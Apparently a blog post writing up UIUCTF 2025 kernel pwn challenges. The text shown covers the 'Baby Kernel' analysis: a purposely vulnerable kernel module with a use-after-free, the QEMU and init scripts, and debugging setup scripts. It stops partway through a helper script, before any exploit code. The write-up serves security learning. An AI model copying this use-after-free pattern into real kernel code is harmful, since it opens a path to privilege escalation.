<!DOCTYPE html>
<html lang="en">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>UIUCTF 2025 - Infobahn</title><meta name="Description" content="infoabhn"><meta property="og:url" content="http://localhost:1313/posts/uiuctf_2025/">
  <meta property="og:site_name" content="Infobahn">
  <meta property="og:title" content="UIUCTF 2025">
  <meta property="og:description" content="Writeups of the pwn challenges from UIUCTF 2025">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-07-30T00:00:00+00:00">
    <meta property="article:modified_time" content="2025-07-30T00:00:00+00:00">
    <meta property="article:tag" content="PWN">
    <meta property="article:tag" content="Kernel">
    <meta property="article:tag" content="Use-After-Free">
    <meta property="article:tag" content="Telefork">
    <meta property="article:tag" content="Retspill">
    <meta property="article:tag" content="KROP">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="UIUCTF 2025">
  <meta name="twitter:description" content="Writeups of the pwn challenges from UIUCTF 2025">
<meta name="application-name" content="My cool site">
<meta name="apple-mobile-web-app-title" content="My cool site">
<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/posts/uiuctf_2025/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "UIUCTF 2025",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "http:\/\/localhost:1313\/posts\/uiuctf_2025\/"
        },"genre": "posts","keywords": "PWN, kernel, Use-After-Free, telefork, retspill, KROP, mimalloc, UEFI, Lua, Secure Boot, EDK2","wordcount":  7086 ,
        "url": "http:\/\/localhost:1313\/posts\/uiuctf_2025\/","datePublished": "2025-07-30T00:00:00+00:00","dateModified": "2025-07-30T00:00:00+00:00","publisher": {
            "@type": "Organization",
            "name": ""},"author": {
                "@type": "Person",
                "name": "0xM4hm0ud"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script>(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Infobahn">Infobahn</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Infobahn">Infobahn</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
            </a></div>
    </div>
</header><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">UIUCTF 2025</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>0xM4hm0ud</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2025-07-30">2025-07-30</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;7086 words&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;34 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ol>
    <li><a href="#baby-kernel">Baby Kernel</a>
      <ol>
        <li><a href="#challenge-analysis">Challenge analysis</a></li>
        <li><a href="#setup">Setup</a>
          <ol>
            <li><a href="#decompilesh">decompile.sh</a></li>
            <li><a href="#compilesh">compile.sh</a></li>
            <li><a href="#gdbscript">gdbscript</a></li>
            <li><a href="#usage">usage</a></li>
          </ol>
        </li>
        <li><a href="#exploitation">Exploitation</a>
          <ol>
            <li><a href="#authors-solution">Author&rsquo;s solution</a></li>
            <li><a href="#my-solution">My solution</a>
              <ol>
                <li><a href="#target-object">Target object</a></li>
                <li><a href="#uaf">UAF</a></li>
                <li><a href="#leaks">Leaks</a></li>
                <li><a href="#rip-control">RIP control</a></li>
                <li><a href="#rop-chain">ROP chain</a></li>
              </ol>
            </li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#do-re-mi">do re mi</a>
      <ol>
        <li><a href="#challenge-analysis-1">Challenge analysis</a></li>
        <li><a href="#setup-1">Setup</a></li>
        <li><a href="#exploitation-1">Exploitation</a></li>
      </ol>
    </li>
    <li><a href="#luaefi">Lua.efi</a>
      <ol>
        <li><a href="#challenge-analysis-2">Challenge Analysis</a></li>
        <li><a href="#setup-2">Setup</a></li>
        <li><a href="#exploitation-2">Exploitation</a></li>
      </ol>
    </li>
  </ol>
</nav></div>
            </div><div class="content" id="content"><p>Original writeup can be read <a href="https://0xm4hm0ud.me/posts/uiuctf-2025" target="_blank" rel="noopener noreffer ">here</a></p>
<h1 id="baby-kernel">Baby Kernel</h1>
<table>
  <thead>
      <tr>
          <th></th>
          <th></th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td><strong>CTF</strong></td>
          <td><a href="https://2025.uiuc.tf/" target="_blank" rel="noopener noreffer ">UIUCTF</a> <a href="https://ctftime.org/event/2640" target="_blank" rel="noopener noreffer ">(CTFtime)</a></td>
      </tr>
      <tr>
          <td><strong>Author</strong></td>
          <td>nikhil</td>
      </tr>
      <tr>
          <td><strong>Category</strong></td>
          <td>Pwn</td>
      </tr>
      <tr>
          <td><strong>Solves</strong></td>
          <td>52</td>
      </tr>
  </tbody>
</table>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/uiuctf_2025/images/babykernel.png"
        data-srcset="/posts/uiuctf_2025/images/babykernel.png, /posts/uiuctf_2025/images/babykernel.png 1.5x, /posts/uiuctf_2025/images/babykernel.png 2x"
        data-sizes="auto"
        alt="/posts/uiuctf_2025/images/babykernel.png"
        title="img" width="420" height="271" /></p>
<h2 id="challenge-analysis">Challenge analysis</h2>
<p>We can download the handout and see that it contains a few files:</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/uiuctf_2025/images/kernelhandout.png"
        data-srcset="/posts/uiuctf_2025/images/kernelhandout.png, /posts/uiuctf_2025/images/kernelhandout.png 1.5x, /posts/uiuctf_2025/images/kernelhandout.png 2x"
        data-sizes="auto"
        alt="/posts/uiuctf_2025/images/kernelhandout.png"
        title="img" width="945" height="299" /></p>
<p>The files explained:</p>
<ul>
<li><code>bzImage</code> is the kernel image.</li>
<li><code>initrd.cpio.gz</code> is the initramfs file system.</li>
<li><code>run.sh</code> is a script used to run the kernel with <a href="https://www.qemu.org/" target="_blank" rel="noopener noreffer ">QEMU</a>.</li>
<li><code>vuln.c</code> is the source code of the vulnerable driver</li>
<li><code>vuln.ko</code> is the compiled version of the vulnerable driver</li>
</ul>
<p>Let&rsquo;s take a look at the vulnerable driver:</p>
<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
    <div class="code-header language-c">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/module.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/kernel.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/init.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/miscdevice.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/fs.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/ioctl.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/uaccess.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#define K1_TYPE 0xB9
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#define ALLOC _IOW(K1_TYPE, 0, size_t)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define FREE _IO(K1_TYPE, 1)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define USE_READ _IOR(K1_TYPE, 2, char)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define USE_WRITE _IOW(K1_TYPE, 2, char)
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">long</span> <span class="nf">handle_ioctl</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">cmd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">arg</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">file_operations</span> <span class="n">fops</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="n">owner</span> <span class="o">=</span> <span class="n">THIS_MODULE</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="n">unlocked_ioctl</span> <span class="o">=</span> <span class="n">handle_ioctl</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">miscdevice</span> <span class="n">vuln_dev</span> <span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="n">minor</span> <span class="o">=</span> <span class="n">MISC_DYNAMIC_MINOR</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="n">name</span> <span class="o">=</span> <span class="s">&#34;vuln&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="n">fops</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">fops</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span><span class="o">*</span> <span class="n">buf</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">size_t</span> <span class="n">size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">long</span> <span class="nf">handle_ioctl</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">cmd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">arg</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">switch</span> <span class="p">(</span><span class="n">cmd</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="nl">ALLOC</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="kt">ssize_t</span> <span class="n">n</span> <span class="o">=</span>  <span class="nf">copy_from_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">size</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">arg</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">size_t</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">n</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">n</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="n">buf</span> <span class="o">=</span> <span class="nf">kzalloc</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">GFP_KERNEL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">};</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="nl">FREE</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">buf</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="nf">kfree</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="nl">USE_READ</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">buf</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nf">copy_to_user</span><span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">arg</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="nl">USE_WRITE</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">buf</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nf">copy_from_user</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">arg</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">default</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int32_t</span> <span class="nf">vuln_init</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">ret</span> <span class="o">=</span> <span class="nf">misc_register</span><span class="p">(</span><span class="o">&amp;</span><span class="n">vuln_dev</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printk</span><span class="p">(</span><span class="n">KERN_ERR</span> <span class="s">&#34;Failed to register device</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">vuln_exit</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">misc_deregister</span><span class="p">(</span><span class="o">&amp;</span><span class="n">vuln_dev</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">MODULE_LICENSE</span><span class="p">(</span><span class="s">&#34;GPL&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nf">MODULE_AUTHOR</span><span class="p">(</span><span class="s">&#34;UIUCTF Inc.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nf">MODULE_DESCRIPTION</span><span class="p">(</span><span class="s">&#34;Vulnerable Kernel Module&#34;</span><span class="p">);</span>  
</span></span><span class="line"><span class="cl"><span class="nf">module_init</span><span class="p">(</span><span class="n">vuln_init</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nf">module_exit</span><span class="p">(</span><span class="n">vuln_exit</span><span class="p">);</span></span></span></code></pre></div></div>
<p>We can see that an <code>ioctl</code> handler is registered. Inside the handler, we can use four different commands: <code>ALLOC</code>, <code>FREE</code>, <code>USE_READ</code>, and <code>USE_WRITE</code>.</p>
<ul>
<li><code>ALLOC</code> copies a size value from the user and stores it in the size variable. It then allocates memory using kzalloc with the specified size and stores the resulting pointer in the buf variable.</li>
<li><code>FREE</code> frees the memory pointed to by buf.</li>
<li><code>USE_READ</code> reads data from the buffer at buf with the specified size and copies it to user space.</li>
<li><code>USE_WRITE</code> writes data from user space into the buffer pointed to by buf.</li>
</ul>
<p>However, we can see that after the buffer is freed with <code>FREE</code>, the buf pointer is not set to <code>NULL</code>. This means we can still access it using the other commands (<code>USE_READ</code> or <code>USE_WRITE</code>) after it has been freed. This results in a <strong>Use-After-Free (UAF)</strong> vulnerability.</p>
<p>Additionally, the module allows us to allocate memory of <strong>any size</strong>.</p>
<p>Let&rsquo;s take a look at the run script:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-sh">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="cp">#! /bin/sh
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="c1"># Note: -serial mon:stdio is here for convenience purposes.</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Remotely the chal is run with -serial stdio.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">qemu-system-x86_64 <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -no-reboot <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -cpu max <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -net none <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -serial mon:stdio <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -display none <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -monitor none <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -vga none <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -kernel bzImage <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -initrd initrd.cpio.gz <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -append <span class="s2">&#34;console=ttyS0&#34;</span></span></span></code></pre></div></div>
<p>This invokes QEMU with our kernel image and initramfs. The <code>-cpu max</code> option enables all supported CPU features—meaning SMEP, SMAP, KPTI, and any others your host CPU offers are turned on.</p>
<p>We can check the <code>init</code> file after extracting the initramfs file system:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-sh">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="cp">#!/bin/sh
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl">mkdir -p /proc /sys /tmp
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">mount -t devtmpfs devtmpfs /dev
</span></span><span class="line"><span class="cl">mkdir /dev/pts
</span></span><span class="line"><span class="cl">mount -t devpts none /dev/pts
</span></span><span class="line"><span class="cl">mount -t proc none /proc
</span></span><span class="line"><span class="cl">mount -t sysfs none /sys
</span></span><span class="line"><span class="cl">mount -t tmpfs none /tmp
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">mkdir /mnt
</span></span><span class="line"><span class="cl"><span class="k">if</span> mount -t 9p -o <span class="nv">trans</span><span class="o">=</span>virtio flag /mnt<span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">    cp /mnt/flag.txt /flag.txt
</span></span><span class="line"><span class="cl">    umount /mnt
</span></span><span class="line"><span class="cl"><span class="k">else</span>
</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s1">&#39;uiuctf{test_flag}&#39;</span> &gt; /flag.txt
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">chown 0:0 /flag.txt
</span></span><span class="line"><span class="cl">chmod <span class="m">0400</span> flag.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">cat &lt;&lt;!
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Welcome to baby-kernel!
</span></span><span class="line"><span class="cl">Boot took <span class="k">$(</span>cut -d<span class="s1">&#39; &#39;</span> -f1 /proc/uptime<span class="k">)</span> seconds
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">!
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">insmod vuln.ko
</span></span><span class="line"><span class="cl">chmod <span class="m">0666</span> /dev/vuln
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">exec</span> setsid cttyhack setuidgid <span class="m">1000</span> /bin/sh 0&lt;&gt;<span class="s2">&#34;/dev/ttyS0&#34;</span> 1&gt;<span class="p">&amp;</span><span class="m">0</span> 2&gt;<span class="p">&amp;</span><span class="m">0</span></span></span></code></pre></div></div>
<p>We can see that the script mounts the flag. If the flag is not available, it writes a placeholder (<code>uiuctf{test_flag}</code>) to flag.txt.
The vulnerable kernel module is loaded using <code>insmod</code>. The script then spawns <code>/bin/sh</code> as user ID 1000. For debugging purposes, we can change this to UID 0 to get a root shell.</p>
<h2 id="setup">Setup</h2>
<p>Before we dive into exploitation, we need a setup for debugging. The environment I use includes a few helper scripts.</p>
<h3 id="decompilesh">decompile.sh</h3>
<p>This script extracts the contents of the initramfs into a folder:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-sh">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="c1"># Decompress a .cpio.gz packed file system</span>
</span></span><span class="line"><span class="cl">mkdir initramfs
</span></span><span class="line"><span class="cl"><span class="nb">pushd</span> . <span class="o">&amp;&amp;</span> <span class="nb">pushd</span> initramfs
</span></span><span class="line"><span class="cl">cp ../initrd.cpio.gz .
</span></span><span class="line"><span class="cl">gzip -dc initrd.cpio.gz <span class="p">|</span> cpio -idm <span class="p">&amp;</span>&gt;/dev/null <span class="o">&amp;&amp;</span> rm initrd.cpio.gz</span></span></code></pre></div></div>
<h3 id="compilesh">compile.sh</h3>
<p>This script compiles an exploit into the file system, recompiles the initramfs, and then launches QEMU.</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-sh">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="c1"># Compress initramfs with the included statically linked exploit</span>
</span></span><span class="line"><span class="cl"><span class="nv">in</span><span class="o">=</span><span class="nv">$1</span>
</span></span><span class="line"><span class="cl"><span class="nv">out</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="nv">$in</span> <span class="p">|</span> awk <span class="s1">&#39;{ print substr( $0, 1, length($0)-2 ) }&#39;</span><span class="k">)</span>
</span></span><span class="line"><span class="cl">gcc <span class="nv">$in</span> -static -masm<span class="o">=</span>intel -o <span class="nv">$out</span> <span class="o">||</span> <span class="nb">exit</span> <span class="m">255</span>
</span></span><span class="line"><span class="cl">mv <span class="nv">$out</span> initramfs/
</span></span><span class="line"><span class="cl"><span class="nb">pushd</span> . <span class="o">&amp;&amp;</span> <span class="nb">pushd</span> initramfs
</span></span><span class="line"><span class="cl">find . -print0 <span class="p">|</span> cpio --null --format<span class="o">=</span>newc -o 2&gt;/dev/null <span class="p">|</span> gzip -9 &gt; ../initrd.cpio.gz
</span></span><span class="line"><span class="cl"><span class="nb">popd</span>
</span></span><span class="line"><span class="cl">
